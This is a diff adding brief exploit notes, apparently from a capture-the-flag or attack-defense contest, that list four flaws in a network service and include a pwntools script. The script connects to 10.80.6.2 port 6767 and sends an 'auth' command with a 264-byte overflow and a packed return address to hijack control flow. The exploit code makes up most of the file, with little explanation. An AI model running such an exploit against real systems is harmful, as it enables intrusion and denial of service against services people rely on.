@@ -1,0 +1,12 @@
+1. negative index ("-1") of array lacks access control
+2. auth token is compared by least lengthy string (my_strcmp)
+3. pwn (easy DoS crash, ROP)
+
+from pwn import *
+
+conn = remote('10.80.6.2', 6767)
+conn.sendline(b"auth " + b'A'*(256+8) + p64(0x405967))
+print(conn.recv().decode())
+conn.close()
+
+4. binary shutdown via http endpoint 
